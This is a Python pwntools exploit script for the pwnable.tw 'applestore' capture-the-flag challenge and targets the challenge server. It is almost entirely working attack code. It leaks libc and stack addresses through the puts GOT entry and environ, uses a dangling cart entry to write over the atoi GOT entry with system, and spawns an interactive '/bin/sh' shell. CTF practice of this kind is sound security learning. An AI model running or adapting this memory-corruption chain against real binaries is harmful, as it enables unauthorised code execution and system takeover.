import numpy
from pwn import *

import numpy as np

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './applestore_patched'
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10104) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, """b delete
    b checkout""")



##########################
##### OFFSET FINDER ######
##########################

#####################
#### Find Gadgets ###
#####################
def add(idx):
	P.sendafter(b'>', b'2')
	P.sendafter(b'> ', idx)

def delete(idx):
	P.sendafter(b'>', b'3')
	P.sendafter(b'Item Number> ', idx)

def cart(confirmation):
	P.sendafter(b'>', b'4')
	P.sendafter(b'> ', confirmation)

def checkout(confirmation):
	P.sendafter(b'>', b'5')
	P.sendafter(b'> ', confirmation)

def get_vuln():
    for i in range(0,20):
        add(b'2')
    for i in range(0, 6):
        add(b'1')

get_vuln()
checkout(b'y')
cart(b'yy'+p32(ELF_LOADED.got['puts'])+p32(0)*3)
P.recvuntil(b'27: ')
leak = P.recv(4)
LIBC.address = u32(leak) - LIBC.sym['puts']
print('leak libc:', hex(LIBC.address))

cart(b'yy'+p32(LIBC.sym['environ'])+p32(0)*3)
P.recvuntil(b'27: ')
leak = P.recv(4)
stack_ebp = u32(leak) - 0x104
print('leak stack:', hex(stack_ebp))

delete(b'27'+p32(0)+p32(1)+p32(stack_ebp-0xc)+p32(ELF_LOADED.got['atoi']+0x22))

P.sendlineafter(b'>', p32(LIBC.sym['system']) + b';/bin/sh;')

P.interactive() #Interact with your shell :)
